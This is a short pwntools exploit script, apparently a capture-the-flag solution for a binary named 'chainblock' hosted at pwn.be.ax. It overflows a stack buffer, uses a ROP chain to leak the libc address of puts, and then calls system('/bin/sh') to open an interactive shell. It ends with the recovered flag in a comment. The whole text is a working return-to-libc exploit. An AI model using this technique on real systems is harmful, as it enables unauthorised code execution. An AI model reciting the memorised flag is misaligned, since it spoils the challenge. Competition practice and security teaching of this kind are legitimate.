from pwn import *

r = remote("pwn.be.ax", 5000)

r.recvuntil("Please enter your name: ")

elf = context.binary = ELF('chainblock')
rop = ROP(elf)
libc = ELF('libc.so.6')

padding = b'A'*264 
main = elf.symbols.main

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']).address)

payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendline(payload)

[print(r.recvline()) for _ in range(1)]

leaked = r.recvline().strip()
puts_leak = u64(leaked.ljust(8,b'\x00'))
log.info(f"leaked puts address @ {hex(puts_leak)}")

libc.address = puts_leak - libc.symbols['puts']
log.info(f"libc base @ {hex(libc.address)}")

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
log.info(f"/bin/sh located @ {hex(bin_sh)}")
log.info(f"system function located @ {hex(system)}")
ret = (rop.find_gadget(['ret']).address)

payload2 = padding  + p64(pop_rdi) + p64(bin_sh) + p64(ret)+ p64(system)
r.sendline(payload2)

r.interactive()

# flag = corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
